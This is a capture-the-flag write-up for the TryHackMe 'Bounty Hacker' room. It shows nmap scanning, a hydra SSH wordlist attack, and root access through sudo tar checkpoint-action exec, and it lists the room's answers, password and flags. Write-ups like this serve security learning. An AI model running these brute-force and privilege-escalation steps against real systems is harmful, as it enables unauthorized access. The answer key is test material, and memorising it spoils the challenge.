---
layout: post
title: Bounty Hacker
date: 2023-01-02 12:00 +0700
categories: [THM, easy]
---

### Introduction

[Bounty Hacker] is an easy CTF on TryHackMe that focus on wordlist attack and sudo privilege escalation.

![Bounty Hacker](/images/THM/bountyhacker/logo.jpeg)


---

Let's start scanning the machine with nmap.

```sh
nmap -sSV -p- --open --min-rate 5000 <IP> -oN <outputfile.txt>
```

![scan](/images/THM/bountyhacker/Captura.PNG)

Like we can see in the scan, it returns, 3 open ports. We're going to connect to ftp.

```sh
ftp <IP>
```

![ftp](/images/THM/bountyhacker/Captura2.PNG)

We can log in with the anonymous user and If we list the files inner the directory we see 2 files, locks.txt and task.txt.

```sh
cat locks.txt
```

![locks](/images/THM/bountyhacker/Captura3.PNG)

When locks.txt is show up, we see a list. Lets going to think that is a password list.

```sh
cat task.txt
```

![task](/images/THM/bountyhacker/Captura4.PNG)

The other file, when it is shown, we see in the final part the signature of lin.

- Who wrote the task list?
>Answer: lin

With the above information, let's try to do a wordlist attack with [hydra].

```sh
hydra -l lin -P locks.txt <IP> ssh
```

![hydra](/images/THM/bountyhacker/Captura5.PNG)

- What service can you bruteforce with the text file found?
>Answer: ssh

- What is the users password?
>Answer: RedDr4gonSynd1cat3

How we got the credentials, let's connect to the machine.

```sh
ssh lin@<IP>
```

![ssh](/images/THM/bountyhacker/Captura6.PNG)

If we list the files, we can see the user.txt containing the flag.

```sh
ls
cat user.txt
```

![user flag](/images/THM/bountyhacker/Captura7.PNG)

- user.txt
>Answer: THM{CR1M3_SyNd1C4T3}

Now is the time to elevate our privileges so, we try with **sudo -l** to see if we can do something.
With the information returned, we can do the elevation with tar. If we don't know how to do It, we can go to [GTFOBins].

```sh
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=<shell>
```

![sudo](/images/THM/bountyhacker/Captura8.PNG)

Now that we are root, we can go to the /root directory and see the root flag.
And with that we finish this machine.

```sh
cd /root
ls
cat root.txt
```

![root flag](/images/THM/bountyhacker/Captura9.PNG)

- root.txt
>Answer: THM{80UN7Y_h4cK3r}


[Bounty Hacker]: https://tryhackme.com/room/cowboyhacker
[GTFOBins]:https://gtfobins.github.io/
[hydra]:https://github.com/vanhauser-thc/thc-hydra
